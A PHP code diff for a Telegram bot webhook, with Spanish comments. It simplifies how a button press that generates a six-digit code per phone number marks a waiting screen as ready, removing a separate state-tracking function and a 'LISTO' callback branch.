@@ -43,26 +43,6 @@ function marcarListo($telefono)
     file_put_contents(flagPath($telefono), '1');
 }
 
-function setEstado($telefono, $estado)
-{
-    $archivo = rutaCodigos();
-    $datos = [];
-    if (is_file($archivo)) {
-        $json = file_get_contents($archivo);
-        $tmp  = json_decode($json, true);
-        if (is_array($tmp)) {
-            $datos = $tmp;
-        }
-    }
-    $existente = $datos[$telefono] ?? [];
-    if (!is_array($existente)) {
-        $existente = ['codigo' => $existente];
-    }
-    $existente['estado'] = $estado;
-    $datos[$telefono] = $existente;
-    file_put_contents($archivo, json_encode($datos));
-}
-
 function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null)
 {
     if ($botToken === 'PON_AQUI_TU_BOT_TOKEN') {
@@ -99,7 +79,7 @@ if (!$update) {
     exit('No update');
 }
 
-// Solo nos interesan las callback_query de los botones inline
+// Solo nos interesan las callback_query del botón inline
 if (isset($update['callback_query'])) {
     $callback = $update['callback_query'];
     $chatId   = $callback['message']['chat']['id'] ?? null;
@@ -114,8 +94,8 @@ if (isset($update['callback_query'])) {
             $nuevoCodigo = random_int(100000, 999999);
             guardarCodigo($telefono, $nuevoCodigo);
 
-            // Marcar estado para indicar que estamos esperando que el usuario escriba el código
-            setEstado($telefono, 'esperando_codigo');
+            // Marcar como listo para que la pantalla de carga pueda continuar
+            marcarListo($telefono);
 
             // Obtener nombre almacenado para ese teléfono (si existe)
             $archivo = rutaCodigos();
@@ -150,13 +130,6 @@ if (isset($update['callback_query'])) {
                 ],
             ];
             enviarATelegram($BOT_TOKEN, $chatId, $texto, $replyMarkup);
-        }
-    } elseif ($chatId && strpos($data, 'LISTO|') === 0) {
-        $telefono = substr($data, strlen('LISTO|'));
-        $telefono = trim($telefono);
-        if ($telefono !== '') {
-            setEstado($telefono, 'listo');
-            enviarATelegram($BOT_TOKEN, $chatId, 'Marcado como listo ✅');
         }
     }
 }
